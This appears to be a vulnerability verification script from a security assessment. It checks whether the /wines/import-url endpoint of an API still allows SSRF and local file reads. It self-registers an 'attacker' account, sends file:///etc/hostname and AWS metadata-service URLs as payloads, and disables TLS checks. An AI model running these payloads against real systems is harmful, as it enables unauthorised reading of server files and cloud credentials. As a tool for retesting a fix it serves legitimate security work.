     1	#!/usr/bin/env python3
     2	"""Verify: SSRF + LFI via POST /wines/import-url on api.taintedport.com.
     3	
     4	Checks whether an authenticated non-admin user can (a) read a local file
     5	via file:// and (b) reach the AWS EC2 metadata service via
     6	http://169.254.169.254/. Either one is sufficient to mark the endpoint as
     7	still vulnerable.
     8	
     9	Required environment variables:
    10	    ATTACKER_PASSWORD    Attacker's password
    11	
    12	Optional (override defaults):
    13	    TARGET_URL           Base API URL (default: https://api.taintedport.com)
    14	    ATTACKER_USERNAME    Attacker's login email
    15	                         (default: validator27+ssrf@test.local — will self-register)
    16	
    17	Usage:
    18	    export ATTACKER_PASSWORD='Testing123!'
    19	    python3 verify.py
    20	
    21	Exit codes: 0 = vulnerable, 1 = not vulnerable / error.
    22	"""
    23	import os, sys, requests, urllib3
    24	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    25	
    26	TARGET_URL    = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    27	ATTACKER_USER = os.environ.get("ATTACKER_USERNAME", "validator27+ssrf@test.local")
    28	ATTACKER_PASS = os.environ.get("ATTACKER_PASSWORD")
    29	
    30	REQUIRED = ["ATTACKER_PASSWORD"]
    31	
    32	def preflight():
    33	    missing = [v for v in REQUIRED if not os.environ.get(v)]
    34	    if missing:
    35	        print("ERROR: missing required environment variables:")
    36	        for v in missing:
    37	            print(f"  {v}")
    38	        print("\nExample:\n  export ATTACKER_PASSWORD='Testing123!'\n  python3 verify.py")
    39	        sys.exit(1)
    40	
    41	def get_token():
    42	    r = requests.post(f"{TARGET_URL}/auth/login",
    43	                      json={"email": ATTACKER_USER, "password": ATTACKER_PASS},
    44	                      timeout=20, verify=False)
    45	    if r.status_code == 200 and r.json().get("token"):
    46	        return r.json()["token"]
    47	    r = requests.post(f"{TARGET_URL}/auth/register",
    48	                      json={"email": ATTACKER_USER, "password": ATTACKER_PASS,
    49	                            "name": "Validator27"},
    50	                      timeout=20, verify=False)
    51	    if r.status_code in (200, 201) and r.json().get("token"):
    52	        return r.json()["token"]
    53	    print(f"[ERROR] cannot obtain token: {r.status_code} {r.text[:200]}")
    54	    sys.exit(1)
    55	
    56	def import_url(token, url):
    57	    r = requests.post(f"{TARGET_URL}/wines/import-url",
    58	                      headers={"Authorization": f"Bearer {token}",
    59	                               "Content-Type": "application/json"},
    60	                      json={"url": url}, timeout=25, verify=False)
    61	    try:
    62	        return r.status_code, r.json().get("raw_content", "") or ""
    63	    except Exception:
    64	        return r.status_code, ""
    65	
    66	def check():
    67	    preflight()
    68	    token = get_token()
    69	
    70	    lfi_status, lfi_raw = import_url(token, "file:///etc/hostname")
    71	    lfi_ok = lfi_status == 200 and lfi_raw and len(lfi_raw.strip()) > 0
    72	
    73	    ssrf_status, ssrf_raw = import_url(token, "http://169.254.169.254/latest/meta-data/")
    74	    ssrf_ok = ssrf_status == 200 and "instance-id" in ssrf_raw
    75	
    76	    if lfi_ok or ssrf_ok:
    77	        details = []
    78	        if lfi_ok:  details.append(f"file:///etc/hostname -> {lfi_raw.strip()!r}")
    79	        if ssrf_ok: details.append("http://169.254.169.254/latest/meta-data/ returned IMDS listing")
    80	        print("[VULNERABLE] " + " ; ".join(details))
    81	        sys.exit(0)
    82	    else:
    83	        print(f"[NOT VULNERABLE] file:// HTTP {lfi_status} raw={lfi_raw[:60]!r} ; "
    84	              f"IMDS HTTP {ssrf_status} raw={ssrf_raw[:60]!r}")
    85	        sys.exit(1)
    86	
    87	if __name__ == "__main__":
    88	    check()